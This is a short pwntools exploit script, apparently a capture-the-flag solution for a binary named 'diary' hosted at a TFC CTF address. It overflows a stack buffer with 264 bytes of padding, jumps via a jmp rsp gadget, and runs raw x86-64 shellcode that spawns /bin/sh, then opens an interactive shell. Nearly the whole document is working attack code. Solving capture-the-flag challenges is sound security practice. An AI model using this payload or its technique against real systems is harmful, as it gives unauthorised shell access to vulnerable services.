from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
#libc = ELF("libc.so.6")

# Same syntax as python2
#p = remote("challs.tfcctf.com", 32090)
#p = process("./diary")
p = gdb.debug("./diary", '''
break *main+94
break *vuln+344
''')

# Same as python2
jmp_rsp = p64(0x000000000040114a)


shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
junk = b"A" * 264


payload = junk + jmp_rsp + shellcode

p.sendline(payload)
p.interactive()

